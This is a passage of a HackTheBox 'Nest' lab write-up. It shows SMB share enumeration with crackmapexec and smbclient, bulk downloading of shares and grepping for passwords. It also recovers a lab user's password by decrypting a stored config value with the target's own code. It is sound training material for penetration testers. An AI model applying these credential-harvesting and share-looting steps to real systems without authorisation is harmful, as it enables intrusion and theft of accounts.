+</pre></td><td class="rouge-code"><pre>❯ crackmapexec smb 10.10.10.178 <span class="nt">-u</span> <span class="s2">"TempUser"</span> <span class="nt">-p</span> <span class="s2">"welcome2019"</span> <span class="nt">--shares</span>
+SMB         10.10.10.178    445    HTB-NEST         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 7 / Server 2008 R2 Build 7601 <span class="o">(</span>name:HTB-NEST<span class="o">)</span> <span class="o">(</span>domain:HTB-NEST<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.10.178    445    HTB-NEST         <span class="o">[</span>+] HTB-NEST<span class="se">\T</span>empUser:welcome2019
+SMB         10.10.10.178    445    HTB-NEST         <span class="o">[</span>+] Enumerated shares
+SMB         10.10.10.178    445    HTB-NEST         Share           Permissions     Remark
+SMB         10.10.10.178    445    HTB-NEST         <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
+SMB         10.10.10.178    445    HTB-NEST         ADMIN<span class="nv">$ </span>                         Remote Admin
+SMB         10.10.10.178    445    HTB-NEST         C<span class="nv">$ </span>                             Default share
+SMB         10.10.10.178    445    HTB-NEST         Data            READ
+SMB         10.10.10.178    445    HTB-NEST         IPC<span class="nv">$ </span>                           Remote IPC
+SMB         10.10.10.178    445    HTB-NEST         Secure<span class="nv">$ </span>        READ
+SMB         10.10.10.178    445    HTB-NEST         Users           READ
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Obviously we must take a look at it, but i can tell you in advance that we will find nothing as we don’t have listing privileges.
+So now, we enumerate the previous shares using the credentials, we might find something intersting that we didn’t have access to before.</p>
+
+<p>When we download the content of <strong>Data</strong>, we will get many more files than when we did it without providing credentials.</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+</pre></td><td class="rouge-code"><pre>❯ smbclient <span class="se">\\\\</span>10.10.10.178<span class="se">\\</span>Data <span class="nt">-U</span> <span class="s2">"TempUser"</span>
+Password <span class="k">for</span> <span class="o">[</span>WORKGROUP<span class="se">\T</span>empUser]:
+Try <span class="s2">"help"</span> to get a list of possible commands.
+smb: <span class="se">\&gt;</span> prompt off
+smb: <span class="se">\&gt;</span> recurse on
+smb: <span class="se">\&gt;</span> mget <span class="k">*</span>
+getting file <span class="se">\S</span>hared<span class="se">\M</span>aintenance<span class="se">\M</span>aintenance Alerts.txt of size 48 as Shared/Maintenance/Maintenance Alerts.txt <span class="o">(</span>0.1 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.1 KiloBytes/sec<span class="o">)</span>
+getting file <span class="se">\I</span>T<span class="se">\C</span>onfigs<span class="se">\A</span>dobe<span class="se">\e</span>diting.xml of size 246 as IT/Configs/Adobe/editing.xml <span class="o">(</span>0.7 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.4 KiloBytes/sec<span class="o">)</span>
+getting file <span class="se">\I</span>T<span class="se">\C</span>onfigs<span class="se">\A</span>dobe<span class="se">\O</span>ptions.txt of size 0 as IT/Configs/Adobe/Options.txt <span class="o">(</span>0.0 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.3 KiloBytes/sec<span class="o">)</span>
+getting file <span class="se">\I</span>T<span class="se">\C</span>onfigs<span class="se">\A</span>dobe<span class="se">\p</span>rojects.xml of size 258 as IT/Configs/Adobe/projects.xml <span class="o">(</span>0.7 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.4 KiloBytes/sec<span class="o">)</span>
+getting file <span class="se">\I</span>T<span class="se">\C</span>onfigs<span class="se">\A</span>dobe<span class="se">\s</span>ettings.xml of size 1274 as IT/Configs/Adobe/settings.xml <span class="o">(</span>2.4 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 1.0 KiloBytes/sec<span class="o">)</span>
+getting file <span class="se">\I</span>T<span class="se">\C</span>onfigs<span class="se">\A</span>tlas<span class="se">\T</span>emp.XML of size 1369 as IT/Configs/Atlas/Temp.XML <span class="o">(</span>2.5 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 1.3 KiloBytes/sec<span class="o">)</span>
+getting file <span class="se">\I</span>T<span class="se">\C</span>onfigs<span class="se">\M</span>icrosoft<span class="se">\O</span>ptions.xml of size 4598 as IT/Configs/Microsoft/Options.xml <span class="o">(</span>9.2 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 2.6 KiloBytes/sec<span class="o">)</span>
+getting file <span class="se">\I</span>T<span class="se">\C</span>onfigs<span class="se">\N</span>otepadPlusPlus<span class="se">\c</span>onfig.xml of size 6451 as IT/Configs/NotepadPlusPlus/config.xml <span class="o">(</span>13.2 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 4.1 KiloBytes/sec<span class="o">)</span>
+getting file <span class="se">\I</span>T<span class="se">\C</span>onfigs<span class="se">\N</span>otepadPlusPlus<span class="se">\s</span>hortcuts.xml of size 2108 as IT/Configs/NotepadPlusPlus/shortcuts.xml <span class="o">(</span>3.9 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 4.1 KiloBytes/sec<span class="o">)</span>
+getting file <span class="se">\I</span>T<span class="se">\C</span>onfigs<span class="se">\R</span>U Scanner<span class="se">\R</span>U_config.xml of size 270 as IT/Configs/RU Scanner/RU_config.xml <span class="o">(</span>0.7 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 3.8 KiloBytes/sec<span class="o">)</span>
+getting file <span class="se">\S</span>hared<span class="se">\T</span>emplates<span class="se">\H</span>R<span class="se">\W</span>elcome Email.txt of size 425 as Shared/Templates/HR/Welcome Email.txt <span class="o">(</span>1.1 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 3.6 KiloBytes/sec<span class="o">)</span>
+smb: <span class="se">\&gt;</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>We can do a recursive grep to search for some password in the retrieved files, let’s take a look:</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre>❯ <span class="nb">grep</span> <span class="nt">-Hri</span> <span class="s2">"password"</span>
+Data/IT/Configs/RU Scanner/RU_config.xml:  &lt;Password&gt;fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE<span class="o">=</span>&lt;/Password&gt;
+Data/Shared/Templates/HR/Welcome Email.txt:Password: welcome2019
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>We will find the password for TempUser and another that appears to be encoded in base64. If we decode the string, we will find out that is actually encrypted and there isn’t much we can do with it.</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre>❯ xxd &lt;<span class="o">(</span><span class="nb">base64</span> <span class="nt">-d</span> <span class="o">&lt;&lt;&lt;</span> <span class="s2">"fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE="</span><span class="o">)</span>
+00000000: 7d31 3301 f603 a33d 58ce 4aa1 4241 fa19  <span class="o">}</span>13....<span class="o">=</span>X.J.BA..
+00000010: 0158 2a9d 5763 9866 edb8 ce3f ceb2 6311  .X<span class="k">*</span>.Wc.f...?..c.
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Aside from the files we retrieved without credentials, we’ll find that there are some configuration file in various formats. We can count how many lines each file has and focus on those that have more.</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre></td><td class="rouge-code"><pre>❯ find <span class="nb">.</span> <span class="nt">-type</span> f <span class="nt">-exec</span> <span class="nb">wc</span> <span class="nt">-l</span> <span class="o">{}</span> <span class="se">\;</span>
+2 ./Adobe/editing.xml
+0 ./Adobe/Options.txt
+2 ./Adobe/projects.xml
+15 ./Adobe/settings.xml
+2 ./Atlas/Temp.XML
+61 ./Microsoft/Options.xml
+102 ./NotepadPlusPlus/config.xml
+25 ./NotepadPlusPlus/shortcuts.xml
+5 ./RU Scanner/RU_config.xml
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Analyzing the configuration file for Notepad++ (./NotepadPlusPlus/config.xml), we can see some file paths at the end.</p>
+
+<div class="language-xml highlighter-rouge"><div class="code-header">
+        <span data-label-text="XML"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td><td class="rouge-code"><pre>   <span class="nt">&lt;History</span> <span class="na">nbMaxFile=</span><span class="s">"15"</span> <span class="na">inSubMenu=</span><span class="s">"no"</span> <span class="na">customLength=</span><span class="s">"-1"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;File</span> <span class="na">filename=</span><span class="s">"C:\windows\System32\drivers\etc\hosts"</span> <span class="nt">/&gt;</span>
+        <span class="nt">&lt;File</span> <span class="na">filename=</span><span class="s">"\\HTB-NEST\Secure$\IT\Carl\Temp.txt"</span> <span class="nt">/&gt;</span>
+        <span class="nt">&lt;File</span> <span class="na">filename=</span><span class="s">"C:\Users\C.Smith\Desktop\todo.txt"</span> <span class="nt">/&gt;</span>
+    <span class="nt">&lt;/History&gt;</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Well, one of them is a SMB path, besides this file is within <strong>Secure$</strong>, a share in which we have read access, so let’s see if we can read the file…</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="rouge-code"><pre>❯ smbclient <span class="se">\\\\</span>10.10.10.178<span class="se">\\</span>Secure<span class="nv">$ </span><span class="nt">-U</span> <span class="s2">"TempUser"</span> <span class="nt">-c</span> <span class="s2">"get IT</span><span class="se">\C</span><span class="s2">arl</span><span class="se">\T</span><span class="s2">emp.txt"</span>
+Password <span class="k">for</span> <span class="o">[</span>WORKGROUP<span class="se">\T</span>empUser]:
+NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file <span class="se">\I</span>T<span class="se">\C</span>arl<span class="se">\T</span>emp.txt
+
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>As we can see, it seems that the Temp.txt file doesn’t exist. Anyway, we have discovered a folder within the <strong>Secure$</strong> share (IT\Carl), let’s see if we have listing rights.</p>
+
+<p>We found some folders, so let’s get and analyze them</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+</pre></td><td class="rouge-code"><pre>
+❯ smbclient //10.10.10.178/Secure<span class="nv">$ </span><span class="nt">-U</span> <span class="s2">"TempUser"</span>
+Password <span class="k">for</span> <span class="o">[</span>WORKGROUP<span class="se">\T</span>empUser]:
+Try <span class="s2">"help"</span> to get a list of possible commands.
+smb: <span class="se">\&gt;</span> <span class="nb">cd </span>IT/Carl
+smb: <span class="se">\I</span>T<span class="se">\C</span>arl<span class="se">\&gt;</span> <span class="nb">ls</span>
+  <span class="nb">.</span>                                   D        0  Wed Aug  7 12:42:14 2019
+  ..                                  D        0  Wed Aug  7 12:42:14 2019
+  Docs                                D        0  Wed Aug  7 12:44:00 2019
+  Reports                             D        0  Tue Aug  6 06:45:40 2019
+  VB Projects                         D        0  Tue Aug  6 07:41:55 2019
+
+                5242623 blocks of size 4096. 1840038 blocks available
+smb: <span class="se">\I</span>T<span class="se">\C</span>arl<span class="se">\&gt;</span> recurse on
+smb: <span class="se">\I</span>T<span class="se">\C</span>arl<span class="se">\&gt;</span> prompt off
+smb: <span class="se">\I</span>T<span class="se">\C</span>arl<span class="se">\&gt;</span> mget <span class="k">*</span>
+getting file <span class="se">\I</span>T<span class="se">\C</span>arl<span class="se">\D</span>ocs<span class="se">\i</span>p.txt of size 56 as Docs/ip.txt <span class="o">(</span>0.1 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.1 KiloBytes/sec<span class="o">)</span>
+getting file <span class="se">\I</span>T<span class="se">\C</span>arl<span class="se">\D</span>ocs<span class="se">\m</span>mc.txt of size 73 as Docs/mmc.txt <span class="o">(</span>0.2 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.2 KiloBytes/sec<span class="o">)</span>
+getting file <span class="se">\I</span>T<span class="se">\C</span>arl<span class="se">\V</span>B Projects<span class="se">\W</span>IP<span class="se">\R</span>U<span class="se">\R</span>UScanner.sln of size 871 as VB Projects/WIP/RU/RUScanner.sln <span class="o">(</span>2.1 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.8 KiloBytes/sec<span class="o">)</span>
+getting file <span class="se">\I</span>T<span class="se">\C</span>arl<span class="se">\V</span>B Projects<span class="se">\W</span>IP<span class="se">\R</span>U<span class="se">\R</span>UScanner<span class="se">\C</span>onfigFile.vb of size 772 as VB Projects/WIP/RU/RUScanner/ConfigFile.vb <span class="o">(</span>1.6 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 1.0 KiloBytes/sec<span class="o">)</span>
+getting file <span class="se">\I</span>T<span class="se">\C</span>arl<span class="se">\V</span>B Projects<span class="se">\W</span>IP<span class="se">\R</span>U<span class="se">\R</span>UScanner<span class="se">\M</span>odule1.vb of size 279 as VB Projects/WIP/RU/RUScanner/Module1.vb <span class="o">(</span>0.6 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.9 KiloBytes/sec<span class="o">)</span>
+getting file <span class="se">\I</span>T<span class="se">\C</span>arl<span class="se">\V</span>B Projects<span class="se">\W</span>IP<span class="se">\R</span>U<span class="se">\R</span>UScanner<span class="se">\R</span>U Scanner.vbproj of size 4828 as VB Projects/WIP/RU/RUScanner/RU Scanner.vbproj <span class="o">(</span>8.8 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 2.5 KiloBytes/sec<span class="o">)</span>
+getting file <span class="se">\I</span>T<span class="se">\C</span>arl<span class="se">\V</span>B Projects<span class="se">\W</span>IP<span class="se">\R</span>U<span class="se">\R</span>UScanner<span class="se">\R</span>U Scanner.vbproj.user of size 143 as VB Projects/WIP/RU/RUScanner/RU Scanner.vbproj.user <span class="o">(</span>0.3 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 2.2 KiloBytes/sec<span class="o">)</span>
+getting file <span class="se">\I</span>T<span class="se">\C</span>arl<span class="se">\V</span>B Projects<span class="se">\W</span>IP<span class="se">\R</span>U<span class="se">\R</span>UScanner<span class="se">\S</span>soIntegration.vb of size 133 as VB Projects/WIP/RU/RUScanner/SsoIntegration.vb <span class="o">(</span>0.3 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 1.9 KiloBytes/sec<span class="o">)</span>
+getting file <span class="se">\I</span>T<span class="se">\C</span>arl<span class="se">\V</span>B Projects<span class="se">\W</span>IP<span class="se">\R</span>U<span class="se">\R</span>UScanner<span class="se">\U</span>tils.vb of size 4888 as VB Projects/WIP/RU/RUScanner/Utils.vb <span class="o">(</span>9.0 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 2.8 KiloBytes/sec<span class="o">)</span>
+getting file <span class="se">\I</span>T<span class="se">\C</span>arl<span class="se">\V</span>B Projects<span class="se">\W</span>IP<span class="se">\R</span>U<span class="se">\R</span>UScanner<span class="se">\M</span>y Project<span class="se">\A</span>pplication.Designer.vb of size 441 as VB Projects/WIP/RU/RUScanner/My Project/Application.Designer.vb <span class="o">(</span>1.1 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 2.7 KiloBytes/sec<span class="o">)</span>
+getting file <span class="se">\I</span>T<span class="se">\C</span>arl<span class="se">\V</span>B Projects<span class="se">\W</span>IP<span class="se">\R</span>U<span class="se">\R</span>UScanner<span class="se">\M</span>y Project<span class="se">\A</span>pplication.myapp of size 481 as VB Projects/WIP/RU/RUScanner/My Project/Application.myapp <span class="o">(</span>1.2 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 2.6 KiloBytes/sec<span class="o">)</span>
+getting file <span class="se">\I</span>T<span class="se">\C</span>arl<span class="se">\V</span>B Projects<span class="se">\W</span>IP<span class="se">\R</span>U<span class="se">\R</span>UScanner<span class="se">\M</span>y Project<span class="se">\A</span>ssemblyInfo.vb of size 1163 as VB Projects/WIP/RU/RUScanner/My Project/AssemblyInfo.vb <span class="o">(</span>2.8 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 2.6 KiloBytes/sec<span class="o">)</span>
+getting file <span class="se">\I</span>T<span class="se">\C</span>arl<span class="se">\V</span>B Projects<span class="se">\W</span>IP<span class="se">\R</span>U<span class="se">\R</span>UScanner<span class="se">\M</span>y Project<span class="se">\R</span>esources.Designer.vb of size 2776 as VB Projects/WIP/RU/RUScanner/My Project/Resources.Designer.vb <span class="o">(</span>4.8 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 2.8 KiloBytes/sec<span class="o">)</span>
+getting file <span class="se">\I</span>T<span class="se">\C</span>arl<span class="se">\V</span>B Projects<span class="se">\W</span>IP<span class="se">\R</span>U<span class="se">\R</span>UScanner<span class="se">\M</span>y Project<span class="se">\R</span>esources.resx of size 5612 as VB Projects/WIP/RU/RUScanner/My Project/Resources.resx <span class="o">(</span>10.7 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 3.4 KiloBytes/sec<span class="o">)</span>
+getting file <span class="se">\I</span>T<span class="se">\C</span>arl<span class="se">\V</span>B Projects<span class="se">\W</span>IP<span class="se">\R</span>U<span class="se">\R</span>UScanner<span class="se">\M</span>y Project<span class="se">\S</span>ettings.Designer.vb of size 2989 as VB Projects/WIP/RU/RUScanner/My Project/Settings.Designer.vb <span class="o">(</span>5.4 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 3.6 KiloBytes/sec<span class="o">)</span>
+getting file <span class="se">\I</span>T<span class="se">\C</span>arl<span class="se">\V</span>B Projects<span class="se">\W</span>IP<span class="se">\R</span>U<span class="se">\R</span>UScanner<span class="se">\M</span>y Project<span class="se">\S</span>ettings.settings of size 279 as VB Projects/WIP/RU/RUScanner/My Project/Settings.settings <span class="o">(</span>0.6 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 3.4 KiloBytes/sec<span class="o">)</span>
+smb: <span class="se">\I</span>T<span class="se">\C</span>arl<span class="se">\&gt;</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Apprently we just found a VisualBasic project named <code class="language-plaintext highlighter-rouge">RUScanner</code>. Interesting…</p>
+
+<hr />
+
+<h2 id="foothold"><span class="me-2">Foothold</span><a href="#foothold" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+
+<h3 id="analyzing-vb-project-source-code"><span class="me-2">Analyzing VB Project Source Code</span><a href="#analyzing-vb-project-source-code" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+
+<p>Since we found a Visual Studio Project we can use it to analyze the source code.
+Oh no… I forgot about it — I don’t know Visual Basic, but no problem; there’s a great extension in Visual Studio that will help us convert an entire VB project code into C# code, just in case you prefer reading C# code.
+Here’s also the <a href="https://github.com/icsharpcode/CodeConverter">GitHub Repository</a> of the
+extention.
+<a href="/assets/img/HackTheBox/Nest/img_2.png" class="popup img-link  shimmer"><img src="/assets/img/HackTheBox/Nest/img_2.png" alt="img_2" loading="lazy"></a></p>
+
+<p>Another way to do this is building the source code and then analyze the binaries using dnSpy for example.</p>
+
+<blockquote>
+  <h4 id="taking-a-look-to-main-method"><span class="me-2">Taking a look to Main method</span><a href="#taking-a-look-to-main-method" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
+</blockquote>
+
+<p>The entry point for the project is in the <strong>Module1.cs</strong> class. It seems that this class is trying to create an instance of <strong>ConfigFile</strong> class using a file named <strong>RU_Config.xml</strong>, and then creating another instance for <strong>SsoIntegration</strong> class using <strong>ConfigFile</strong> object properties, such as, <strong>Config.Username</strong> and applying a method called DecryptString from the <strong>Utils</strong> class to <strong>Config.Password</strong>.</p>
+
+<p><a href="/assets/img/HackTheBox/Nest/img_3.png" class="popup img-link  shimmer"><img src="/assets/img/HackTheBox/Nest/img_3.png" alt="img_3" loading="lazy"></a></p>
+
+<blockquote>
+  <h4 id="decrypting-csmith-password"><span class="me-2">Decrypting c.smith password</span><a href="#decrypting-csmith-password" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
+</blockquote>
+
+<p>If we run the application it will fail, since we don’t have the <strong>RU_Config.xml</strong> file… Or do we? Remember we saw an encrypted password that came from a file called <strong>RU_Config.xml</strong>?</p>
+
+<div class="language-xml highlighter-rouge"><div class="code-header">
+        <span data-label-text="XML"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td><td class="rouge-code"><pre>❯ smbclient "//10.10.10.178/Data/" -U "TempUser" -c 'get "IT/Configs/RU Scanner/RU_config.xml" -'
+Password for [WORKGROUP\TempUser]:
+<span class="cp">&lt;?xml version="1.0"?&gt;</span>
+<span class="nt">&lt;ConfigFile</span> <span class="na">xmlns:xsi=</span><span class="s">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="na">xmlns:xsd=</span><span class="s">"http://www.w3.org/2001/XMLSchema"</span><span class="nt">&gt;</span>
+  <span class="nt">&lt;Port&gt;</span>389<span class="nt">&lt;/Port&gt;</span>
+  <span class="nt">&lt;Username&gt;</span>c.smith<span class="nt">&lt;/Username&gt;</span>
+  <span class="nt">&lt;Password&gt;</span>fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=<span class="nt">&lt;/Password&gt;</span>
+<span class="nt">&lt;/ConfigFile&gt;</span>getting file \IT\Configs\RU Scanner\RU_config.xml of size 270 as - (0.8 KiloBytes/sec) (average 0.8 KiloBytes/sec)
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Well, we can copy this file into the project and see what happens.
+If we run the project, we will get an <strong>System.IO.FileNotFoundException</strong>, indicating that RU_Config.xml file could not be found.</p>
+
+<p><a href="/assets/img/HackTheBox/Nest/img_4.png" class="popup img-link  shimmer"><img src="/assets/img/HackTheBox/Nest/img_4.png" alt="img_4" loading="lazy"></a></p>
+
+<p>So we just need to copy <strong>RU_Config.xml</strong> file from the SMB Data Share to the path where the application is looking for it… And then the error will disappear.</p>
+
+<p>So, now we can simply print the <code class="language-plaintext highlighter-rouge">SsoIntegration</code> password attribute, as it contains the decrypted password.
+<a href="/assets/img/HackTheBox/Nest/img_5.png" class="popup img-link  shimmer"><img src="/assets/img/HackTheBox/Nest/img_5.png" alt="img_5" loading="lazy"></a></p>
+
+<p>Another way to get the decrypted password is just calling the <code class="language-plaintext highlighter-rouge">DecryptString</code> method from Utils.cs class and pass the encrypted password as an argument, this is a more direct approach.
+<a href="/assets/img/HackTheBox/Nest/img_6.png" class="popup img-link  shimmer"><img src="/assets/img/HackTheBox/Nest/img_6.png" alt="img_6" loading="lazy"></a></p>
+
+<p>So nice, we got credentials for <code class="language-plaintext highlighter-rouge">c.smith</code> user.
+First I am going use <code class="language-plaintext highlighter-rouge">CrackMapExec</code> to confirm if these are valid credentials.</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre>❯ crackmapexec smb 10.10.10.178 <span class="nt">-u</span> c.smith <span class="nt">-p</span> <span class="s2">"xRxRxPANCAK3SxRxRx"</span>
+SMB         10.10.10.178    445    HTB-NEST         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 7 / Server 2008 R2 Build 7601 <span class="o">(</span>name:HTB-NEST<span class="o">)</span> <span class="o">(</span>domain:HTB-NEST<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.10.178    445    HTB-NEST         <span class="o">[</span>+] HTB-NEST<span class="se">\c</span>.smith:xRxRxPANCAK3SxRxRx
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Alright, now we’ve got access to <code class="language-plaintext highlighter-rouge">c.smith</code> account. Let’s see what can we do with this user…</p>
+
+<h3 id="enumerating-with-csmith"><span class="me-2">Enumerating with C.Smith</span><a href="#enumerating-with-csmith" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+
+<blockquote>
+  <h4 id="enumerating-smb"><span class="me-2">Enumerating SMB</span><a href="#enumerating-smb" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
+</blockquote>
+
+<p>We will find some resources in the <code class="language-plaintext highlighter-rouge">C.Smith</code> share, including the user flag and another folder named <code class="language-plaintext highlighter-rouge">HQK Reporting</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre></td><td class="rouge-code"><pre>❯ smbclient <span class="s2">"//10.10.10.178/Users/"</span> <span class="nt">-U</span> <span class="s2">"c.smith%xRxRxPANCAK3SxRxRx"</span>
+Try <span class="s2">"help"</span> to get a list of possible commands.
+smb: <span class="se">\&gt;</span> <span class="nb">cd </span>C.Smith
+smb: <span class="se">\C</span>.Smith<span class="se">\&gt;</span> <span class="nb">ls</span>
+  <span class="nb">.</span>                                   D        0  Sun Jan 26 00:21:44 2020
+  ..                                  D        0  Sun Jan 26 00:21:44 2020
+  HQK Reporting                       D        0  Thu Aug  8 16:06:17 2019
+  user.txt                            A       34  Sun Sep  1 12:49:58 2024
+
+                5242623 blocks of size 4096. 1839358 blocks available
+smb: <span class="se">\C</span>.Smith<span class="se">\&gt;</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>So now let’s get those files into our machine and investigate them.</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+</pre></td><td class="rouge-code"><pre>❯ <span class="nb">cd </span>SMB/Users/C.Smith
+
+❯ smbclient <span class="s2">"//10.10.10.178/Users/"</span> <span class="nt">-U</span> <span class="s2">"c.smith%xRxRxPANCAK3SxRxRx"</span>
+Try <span class="s2">"help"</span> to get a list of possible commands.
+smb: <span class="se">\&gt;</span> <span class="nb">cd </span>C.Smith
+smb: <span class="se">\C</span>.Smith<span class="se">\&gt;</span> recurse on
+smb: <span class="se">\C</span>.Smith<span class="se">\&gt;</span> prompt off
+smb: <span class="se">\C</span>.Smith<span class="se">\&gt;</span> mget <span class="k">*</span>
+getting file <span class="se">\C</span>.Smith<span class="se">\u</span>ser.txt of size 34 as user.txt <span class="o">(</span>0.1 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.1 KiloBytes/sec<span class="o">)</span>
+getting file <span class="se">\C</span>.Smith<span class="se">\H</span>QK Reporting<span class="se">\D</span>ebug Mode Password.txt of size 0 as HQK Reporting/Debug Mode Password.txt <span class="o">(</span>0.0 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.1 KiloBytes/sec<span class="o">)</span>
